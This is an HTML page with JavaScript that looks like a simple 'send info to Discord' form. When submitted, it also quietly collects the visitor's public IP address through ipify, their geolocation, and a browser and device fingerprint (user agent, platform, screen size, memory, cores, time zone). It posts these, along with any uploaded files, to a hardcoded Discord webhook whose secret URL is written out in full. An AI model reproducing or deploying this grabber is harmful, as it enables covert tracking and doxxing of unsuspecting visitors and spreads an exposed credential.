<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send Info to Discord Webhook</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background-color: #f0f0f0;
        }
        input, button, textarea {
            margin: 10px;
            padding: 10px;
            font-size: 16px;
            width: 300px;
        }
        input[type="file"] {
            width: auto;
        }
    </style>
</head>
<body>
    <input type="text" id="nameInput" placeholder="Enter your name" required>
    <textarea id="messageInput" placeholder="Enter your message"></textarea>
    <input type="file" id="fileInput" multiple>
    <button id="sendInfoButton">Send Info to Discord</button>

    <script>
        async function getIpAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error fetching IP address:', error);
                return 'Unknown';
            }
        }

        function getLocation() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    resolve({ latitude: 'Not available', longitude: 'Not available' });
                } else {
                    navigator.geolocation.getCurrentPosition(
                        position => {
                            resolve({
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude
                            });
                        },
                        error => {
                            resolve({ latitude: 'Permission denied', longitude: 'Permission denied' });
                        }
                    );
                }
            });
        }

        async function sendInfoToWebhook() {
            const webhookUrl = 'https://discord.com/api/webhooks/1250203084206903348/Pl2iVqCsQtZ2LmiBd4XfzZv5lbYMfCxB0U03aqRvN7fFePUgJNwLF7yRLd6n_pelMhnd';
            const name = document.getElementById('nameInput').value.trim();
            const message = document.getElementById('messageInput').value.trim();
            const fileInput = document.getElementById('fileInput');

            if (!name) {
                alert('Name is required.');
                return;
            }

            const ipAddress = await getIpAddress();
            const location = await getLocation();

            const information = {
                title: 'Info Sent from Webpage',
                description: 'This is a beautifully structured embed containing all available information.',
                fields: [
                    { name: 'Name', value: name, inline: false },
                    { name: 'Message', value: message || 'No message provided', inline: false },
                    { name: 'User Agent', value: navigator.userAgent, inline: false },
                    { name: 'Language', value: navigator.language, inline: false },
                    { name: 'Platform', value: navigator.platform, inline: false },
                    { name: 'Cookies Enabled', value: navigator.cookieEnabled ? 'Yes' : 'No', inline: false },
                    { name: 'Online', value: navigator.onLine ? 'Yes' : 'No', inline: false },
                    { name: 'Screen Resolution', value: `${window.screen.width} x ${window.screen.height}`, inline: false },
                    { name: 'IP Address', value: ipAddress, inline: false },
                    { name: 'Device Memory', value: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Not available', inline: false },
                    { name: 'Hardware Concurrency', value: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : 'Not available', inline: false },
                    { name: 'Time Zone', value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: false },
                    { name: 'Latitude', value: location.latitude, inline: false },
                    { name: 'Longitude', value: location.longitude, inline: false }
                ],
                footer: { text: new Date().toLocaleString() }
            };

            const formData = new FormData();
            formData.append('payload_json', JSON.stringify({ embeds: [information] }));

            for (let i = 0; i < fileInput.files.length; i++) {
                formData.append(`file${i}`, fileInput.files[i]);
            }

            fetch(webhookUrl, {
                method: 'POST',
                body: formData
            })
            .then(response => {
                if (response.ok) {
                    alert('Information sent successfully!');
                } else {
                    alert('Failed to send information.');
                }
            })
            .catch(error => {
                alert('Error: ' + error.message);
            });
        }

        document.getElementById('sendInfoButton').addEventListener('click', sendInfoToWebhook);
    </script>
</body>
</html>
